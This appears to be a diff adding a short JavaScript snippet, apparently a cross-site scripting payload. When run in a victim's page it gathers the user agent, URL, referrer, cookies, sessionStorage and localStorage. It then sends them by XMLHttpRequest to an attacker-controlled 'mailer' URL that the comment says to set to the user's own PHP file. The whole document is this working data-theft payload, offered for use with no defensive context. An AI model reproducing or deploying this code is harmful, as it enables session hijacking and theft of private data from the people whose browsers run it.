@@ -1,0 +1,27 @@
+<script>
+  var mailer = "URL"; // Replace with your PHP file's URL On your Host Server
+
+  var message =
+    "USER AGENT\t" + navigator.userAgent + "\n\nTARGET URL\t" + document.URL;
+  message +=
+    "\n\nREFERRER URL\t" +
+    document.referrer +
+    "\n\nREADABLE COOKIES\t" +
+    document.cookie;
+  message +=
+    "\n\nSESSION STORAGE\t" +
+    JSON.stringify(sessionStorage) +
+    "\n\nLOCAL STORAGE\t" +
+    JSON.stringify(localStorage);
+
+  // Encode the data for use in a URL
+  var params =
+    "origin=" +
+    encodeURIComponent(document.location.origin) +
+    "&message=" +
+    encodeURIComponent(message);
+
+  var r = new XMLHttpRequest();
+  r.open("GET", mailer + "?" + params, true);
+  r.send();
+</script>
